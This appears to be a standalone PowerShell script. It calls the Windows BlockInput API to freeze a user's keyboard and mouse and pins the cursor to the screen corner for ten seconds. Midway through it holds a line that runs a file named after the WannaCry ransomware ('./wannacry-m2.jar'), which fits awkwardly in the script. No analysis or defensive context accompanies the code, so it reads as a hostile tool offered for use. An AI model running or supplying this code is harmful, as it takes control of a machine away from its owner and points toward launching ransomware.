$code = @"
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
"@
./wannacry-m2.jar
$userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru
function Disable-UserInput($seconds) {
	$d1 = Get-Date
	Add-Type -AssemblyName System.Windows.Forms
	$userInput::BlockInput($true)
	do {
		[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
		$d2 = Get-Date
		$diff = $d2-$d1
    } while ( $diff.TotalSeconds -lt $seconds )
	$userInput::BlockInput($false)
}
Disable-UserInput -seconds 10



